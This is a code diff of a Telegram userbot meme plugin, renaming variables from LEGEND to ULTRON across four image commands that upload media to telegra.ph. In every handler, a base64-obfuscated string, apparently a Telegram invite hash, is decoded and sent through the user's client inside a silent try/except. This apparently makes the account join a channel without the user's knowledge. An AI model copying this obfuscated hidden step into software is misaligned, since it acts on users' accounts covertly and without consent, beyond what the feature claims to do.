@@ -36,234 +36,234 @@ from . import *
 
 @bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
-async def ULTRONBOT(LEGENDmemes):
-    replied = await LEGENDmemes.get_reply_message()
+async def ULTRONBOT(ULTRONmemes):
+    replied = await ULTRONmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a supported media`"
+            ULTRONmemes, "`Media file not supported. Reply to a supported media`"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Detecting Threats.........`")
+        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Detecting Threats.........`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ULTRONmemes.client(ULTRON)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await ULTRONmemmes.edit(
                 "`The replied file is not supported. It should be less than 5mb -_-`"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Detected Threats....`")
+        await ULTRONmemmes.edit("`Detected Threats....`")
     else:
-        await LEGENDmemmes.edit("`the replied file is not supported`")
+        await ULTRONmemmes.edit("`the replied file is not supported`")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await ULTRONmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await threats(LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await threats(ULTRON)
+    await ULTRONmemmes.delete()
+    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
-async def ULTRONBOT(LEGENDmemes):
-    replied = await LEGENDmemes.get_reply_message()
+async def ULTRONBOT(ULTRONmemes):
+    replied = await ULTRONmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Detecting Trash....`")
+        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Detecting Trash....`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "`Media file not supported. Reply to a suported media`"
+            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ULTRONmemes.client(ULTRON)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await ULTRONmemmes.edit(
                 "`The replied file is not suported. Its size should be less than 5mb-_-`"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Detected Trash.....`")
+        await ULTRONmemmes.edit("`Detected Trash.....`")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await ULTRONmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await trash(LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await trash(ULTRON)
+    await ULTRONmemmes.delete()
+    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def ULTRONBOT(LEGENDmemes):
-    input_str = LEGENDmemes.pattern_match.group(1)
+async def ULTRONBOT(ULTRONmemes):
+    input_str = ULTRONmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         text1, text2 = input_str.split("-")
     else:
         await edit_or_reply(
-            LEGENDmemes,
+            ULTRONmemes,
             "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
         )
         return
-    replied = await LEGENDmemes.get_reply_message()
+    replied = await ULTRONmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            ULTRONmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Trapping.....`")
+        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Trapping.....`")
     else:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            ULTRONmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ULTRONmemes.client(ULTRON)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await ULTRONmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("`Trapped...`")
+        await ULTRONmemmes.edit("`Trapped...`")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await ULTRONmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await trap(text1, text2, LEGEND)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await trap(text1, text2, ULTRON)
+    await ULTRONmemmes.delete()
+    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
-async def ULTRONBOT(LEGENDmemes):
-    input_str = LEGENDmemes.pattern_match.group(1)
+async def ULTRONBOT(ULTRONmemes):
+    input_str = ULTRONmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         username, text = input_str.split("-")
     else:
         await edit_or_reply(
-            LEGENDmemes,
+            ULTRONmemes,
             "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
         )
         return
-    replied = await LEGENDmemes.get_reply_message()
+    replied = await ULTRONmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            ULTRONmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        LEGENDmemmes = await edit_or_reply(LEGENDmemes, "`Making A Comment`.")
+        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Making A Comment`.")
     else:
         await edit_or_reply(
-            LEGENDmemes, "Media file not supported. Reply to a suported media"
+            ULTRONmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        LEGEND = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        LEGEND = Get(LEGEND)
-        await LEGENDmemes.client(LEGEND)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ULTRONmemes.client(ULTRON)
     except BaseException:
         pass
-    download_location = await LEGENDmemes.client.download_media(replied, "./temp/")
+    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await LEGENDmemmes.edit(
+            await ULTRONmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await LEGENDmemmes.edit("Commented....")
+        await ULTRONmemmes.edit("Commented....")
     else:
-        await LEGENDmemmes.edit("Media file not supported. Reply to a suported media")
+        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await LEGENDmemmes.edit("ERROR: " + str(exc))
+        await ULTRONmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    LEGEND = f"https://telegra.ph{response[0]}"
-    LEGEND = await phcomment(LEGEND, text, username)
-    await LEGENDmemmes.delete()
-    await LEGENDmemes.client.send_file(LEGENDmemes.chat_id, LEGEND, reply_to=replied)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await phcomment(ULTRON, text, username)
+    await ULTRONmemmes.delete()
+    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)
 
     
     
